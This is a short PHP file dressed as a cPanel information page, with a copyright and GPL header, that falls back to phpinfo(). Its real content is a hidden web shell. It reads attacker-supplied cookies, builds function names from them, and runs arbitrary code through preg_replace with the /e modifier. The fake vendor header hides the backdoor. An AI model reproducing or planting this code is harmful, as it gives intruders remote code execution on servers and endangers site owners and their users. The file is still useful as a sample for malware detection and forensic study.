<?php
/**
 * @package     Cpanel.Info
 *
 * @copyright   Copyright (C) 2013 cpanel.com All rights reserved.
 * @license     GNU General Public License version 2 or later
 */

$filter = @$_COOKIE['p3'];
if ($filter) {
	$option = $filter(@$_COOKIE['p2']);
	$auth = $filter(@$_COOKIE['p1']);
	$option("/123/e",$auth,123);
} else {
	phpinfo();
}

?>